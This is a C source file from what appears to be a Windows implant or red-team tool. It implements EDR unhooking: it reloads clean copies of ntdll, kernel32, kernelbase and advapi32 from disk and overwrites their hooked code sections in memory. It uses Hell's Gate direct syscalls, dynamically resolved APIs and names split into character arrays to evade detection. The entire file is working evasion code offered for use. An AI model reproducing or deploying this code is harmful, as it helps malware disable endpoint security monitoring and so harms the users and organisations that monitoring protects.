#include "unhooking.h"

//dynamically resolved function pointers.
VirtualProtect_t VirtualProtect_p = NULL;
UnmapViewOfFile_t UnmapViewOfFile_p = NULL;
RtlInitUnicodeString_t RtlInitUnicodeString_p = NULL;
t_CloseHandle pCloseHandle = NULL;

//DLL strings.
WCHAR sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
WCHAR sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
WCHAR sKernelBaseDll[] = { 'k','e','r','n','e','l','b','a','s','e','.','d','l','l', 0x0 };
WCHAR sAdVapi32Dll[] = { 'a','d','v','a','p','i','3','2','.','d','l','l',0x0 };
//unsigned char sWinInetDll[] = { 'w','i','n','i','n','e','t','.','d','l','l', 0x0 };


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
	/*
		UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
	*/
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pImgDOSHead->e_lfanew);
	int i;

	// find .text section
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) +
			((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)pImgSectionHead->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&oldprotect);
			if (!oldprotect) {
				// RWX failed!
				return -1;
			}
			// copy fresh .text section into ntdll memory
			memcpy((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				(LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize);

			// restore original protection settings of ntdll memory
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize,
				oldprotect,
				&oldprotect);
			if (!oldprotect) {
				// it failed
				return -1;
			}
			return 0;
		}
	}

	// failed? .text not found!
	return -1;
}

void UnhookStart(PVX_TABLE table) {
	int pid = 0;
	HANDLE hProc = NULL;


	unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
	char strCloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e',0x0 };

	UnmapViewOfFile_p = (UnmapViewOfFile_t)hlpGetProcAddress(hlpGetModuleHandle(sKernel32), (LPCSTR)sUnmapViewOfFile);
	VirtualProtect_p = (VirtualProtect_t)hlpGetProcAddress(hlpGetModuleHandle(sKernel32), (LPCSTR)sVirtualProtect);
	RtlInitUnicodeString_p = (RtlInitUnicodeString_t)hlpGetProcAddress(hlpGetModuleHandle(sNtdll), (LPCSTR)"RtlInitUnicodeString");
	pCloseHandle = (t_CloseHandle)hlpGetProcAddress(hlpGetModuleHandle(sKernel32), strCloseHandle);


	WCHAR sKBase[] = { '\\','?','?','\\','C',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\','k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l', 0x0 };
	WCHAR sK32Path[] = { '\\','?','?','\\','C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
	WCHAR sNtdllPath[] = { '\\','?','?','\\','C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','N','t','d','l','l','.','d','l','l', 0x0 };
	WCHAR sAdvApi32Path[] = { '\\','?','?','\\','C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','a','d','v','a','p','i','3','2','.','d','l','l', 0x0 };
	//WCHAR sWinInetPath[] = { '\\','?','?','\\','C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','w','i','n','i','n','e','t','.','d','l','l', 0x0 };

	unHookLibrary(sNtdllPath, sNtdll, table);
	unHookLibrary(sK32Path, sKernel32, table);
	unHookLibrary(sKBase, sKernelBaseDll, table);
	unHookLibrary(sAdvApi32Path, sAdVapi32Dll, table);

	// doesn't look like WinInetDLL is hooked. So I cam going to skip it. also this requires me to load the library before hand which I do in the web utilities run.
	//unHookLibrary(sWinInetDll, sWinInetPath, table);

}


BOOL unHookLibrary(WCHAR sNtdllPath[], wchar_t sdll[], PVX_TABLE table) {
	LPVOID pMapping;
	int ret = 0;

	UNICODE_STRING str;
	RtlInitUnicodeString_p(&str, sNtdllPath);

	NTSTATUS status = 0x00000000;
	HANDLE fHandle = NULL;
	OBJECT_ATTRIBUTES objAttributes = { 0 };
	InitializeObjectAttributes(&objAttributes, &str, OBJ_CASE_INSENSITIVE, NULL, NULL);
	objAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	IO_STATUS_BLOCK IoStatusBlock = { 0 };

	//NtCreateFile call.
	HellsGate(table->NtOpenFile.wSystemCall);
	status = HellDescent(&fHandle, 0x100021, &objAttributes, &IoStatusBlock, FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
	//HellsGate(table->NtCreateFile.wSystemCall);
	//status = HellDescent(&fHandle, GENERIC_READ, &objAttributes, &IoStatusBlock, NULL, NULL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);

	//fHandle = CreateFileA("C:\\Windows\\System32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	//https://gist.github.com/slaeryan/cd5edfac7a99547a14e808bd1541256e NtMapView | NtCreateSection examples. I was close but this helped.
	
	HANDLE sectionHandle = NULL;
	HellsGate(table->NtCreateSection.wSystemCall);
	status = HellDescent(&sectionHandle, SECTION_MAP_READ | SECTION_QUERY | SECTION_MAP_EXECUTE, NULL, NULL, PAGE_EXECUTE_READ, SEC_IMAGE, fHandle);
	if (status) {
		pCloseHandle(fHandle);
		pCloseHandle(sectionHandle);
		exit(-1);
	}
	PHANDLE sectionBaseAddress = NULL;
	HellsGate(table->NtMapViewOfSection.wSystemCall);
	SIZE_T size = 0;

	status = HellDescent(sectionHandle, NtCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &size, 1, NULL, PAGE_EXECUTE_WRITECOPY);
	if (status != 0 && status != STATUS_IMAGE_NOT_AT_BASE) {
		//printf("[-] NtMapViewOfSection error: %X\n", status);
		pCloseHandle(fHandle);
		pCloseHandle(sectionHandle);
		UnmapViewOfFile_p(sectionBaseAddress);
		exit(-1);
	}

	pMapping = sectionBaseAddress;
	// remove hooks
	ret = UnhookNtdll(hlpGetModuleHandle((LPCWSTR)sdll), pMapping);

	// Clean up.
	UnmapViewOfFile_p(pMapping);


	pCloseHandle(fHandle);
	pCloseHandle(sectionHandle);

	return ret;
}

